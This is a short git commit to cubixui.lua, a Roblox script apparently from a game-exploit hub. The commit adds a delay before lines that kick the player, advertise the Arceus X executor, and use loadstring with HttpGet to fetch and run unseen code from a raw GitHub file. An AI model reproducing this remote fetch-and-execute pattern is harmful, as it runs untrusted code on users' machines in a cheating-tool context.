38576c92bbd51a17904e0f9b336c69954174aa82
Tiahh <33553223+Tiahh@users.noreply.github.com>
2024-02-14 17:09:12 +0100

    Update cubixui.lua

--- cubixui.lua
+++ cubixui.lua
@@ -1,3 +1,4 @@
+wait(5)
 game:GetService("Players").LocalPlayer:Kick("Cubix has been disabled by the SPDM Team. Download Arceus X instead https://spdmteam.com");
 wait(100)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/bot21333/sss/main/message_2.txt', true))();
